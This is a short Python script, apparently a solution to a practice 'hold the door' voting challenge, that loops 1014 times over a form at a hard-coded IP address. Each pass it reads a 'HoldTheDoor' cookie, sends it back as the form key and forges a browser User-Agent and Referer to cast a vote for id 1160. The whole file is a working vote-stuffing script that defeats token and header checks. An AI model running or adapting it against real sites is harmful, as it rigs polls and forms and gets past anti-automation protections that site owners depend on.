#!/usr/local/bin/python3
import requests

url = "http://158.69.76.135/level2.php"
sesion = requests.Session()
for i in range(1014):
    r = sesion.get(url)
    cookie = dict(sesion.cookies)
    cabeza = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
    'Referer': url}
    parametros_del_form = {'id': '1160', 'holdthedoor': 'Submit', 'key': cookie['HoldTheDoor']}
    respuesta = sesion.post(url, parametros_del_form, headers=cabeza)
